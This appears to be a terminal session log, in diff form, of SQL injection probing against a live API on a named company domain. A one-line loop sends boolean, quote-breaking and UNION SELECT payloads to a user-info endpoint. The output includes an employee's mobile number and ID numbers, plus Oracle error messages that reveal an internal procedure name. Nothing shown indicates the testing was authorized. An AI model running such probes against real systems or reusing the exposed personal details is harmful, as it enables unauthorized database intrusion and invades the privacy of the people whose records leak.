@@ -1,0 +1,29 @@
+                                                                                                                                                                                                                                            
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ cd ~/narayana-audit && echo "=== A. TOOL CHECK ===" && (sqlmap --version 2>/dev/null | head -n 2) ; (nuclei -version 2>/dev/null | head -n 2) ; echo -e "\n=== B. SQLi PROBES (read-only) ===" && for p in "3334024" "3334024 AND 1=1" "3334024 AND 1=2" "3334024' OR '1'='1" "3334024' OR '1'='2" "3334024 UNION SELECT NULL FROM DUAL" ; do enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$p") ; code=$(curl -k -s -o /tmp/r.txt -w "%{http_code}" -m 12 "https://narayanagroup.co.in/NtraktApi/api/User/Info/$enc") ; echo "--- payload: $p" ; echo "    HTTP $code | $(wc -c < /tmp/r.txt) bytes" ; head -c 200 /tmp/r.txt | tr -d '\n' ; echo ; done
+=== A. TOOL CHECK ===
+1.10.9#stable
+
+=== B. SQLi PROBES (read-only) ===
+--- payload: 3334024
+    HTTP 200 | 49900 bytes
+{"data":[{"OperatorCode":null,"OperatorName":null,"Password":null,"Active":null,"LoginId":null,"MobApp":null,"UniqueId":null,"MobileNo":"9966362143","EmpNo":"NES3334024","BioEmpNo":"3334024","EmpPhoto
+--- payload: 3334024 AND 1=1
+    HTTP 500 | 1900 bytes
+{"Message":"An error has occurred.","ExceptionMessage":"ORA-01722: invalid number\nORA-06512: at \"MOBIDB.GET_USERINFO\", line 34\nORA-06512: at line 1\n","ExceptionType":"System.Exception","StackTrac
+--- payload: 3334024 AND 1=2
+    HTTP 500 | 1900 bytes
+{"Message":"An error has occurred.","ExceptionMessage":"ORA-01722: invalid number\nORA-06512: at \"MOBIDB.GET_USERINFO\", line 34\nORA-06512: at line 1\n","ExceptionType":"System.Exception","StackTrac
+--- payload: 3334024' OR '1'='1
+    HTTP 500 | 1900 bytes
+{"Message":"An error has occurred.","ExceptionMessage":"ORA-01722: invalid number\nORA-06512: at \"MOBIDB.GET_USERINFO\", line 34\nORA-06512: at line 1\n","ExceptionType":"System.Exception","StackTrac
+--- payload: 3334024' OR '1'='2
+    HTTP 500 | 1900 bytes
+{"Message":"An error has occurred.","ExceptionMessage":"ORA-01722: invalid number\nORA-06512: at \"MOBIDB.GET_USERINFO\", line 34\nORA-06512: at line 1\n","ExceptionType":"System.Exception","StackTrac
+--- payload: 3334024 UNION SELECT NULL FROM DUAL
+    HTTP 500 | 1900 bytes
+{"Message":"An error has occurred.","ExceptionMessage":"ORA-01722: invalid number\nORA-06512: at \"MOBIDB.GET_USERINFO\", line 34\nORA-06512: at line 1\n","ExceptionType":"System.Exception","StackTrac
+                                                                                                                                                                                                                                            
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ 
+
